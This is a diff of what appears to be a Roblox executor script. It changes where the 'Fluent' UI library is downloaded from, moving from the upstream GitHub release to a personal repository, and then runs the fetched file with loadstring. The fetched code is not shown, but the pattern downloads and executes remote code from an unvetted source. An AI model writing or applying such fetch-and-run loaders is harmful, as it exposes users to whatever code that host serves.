@@ -579,7 +579,7 @@
     Interface.BlurManager = blurEffect
 
         if not isfile("fluent.lua") then
-            writefile("fluent.lua", game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))
+            writefile("fluent.lua", game:HttpGet("https://github.com/caot60002/mybfscripts/releases/download/1.1.0/main.lua"))
         end
         
         local Fluent = loadstring(readfile("fluent.lua"))()
@@ -5210,6 +5210,7 @@
         Report(response2)
     end
 end)()
+
 
 
 
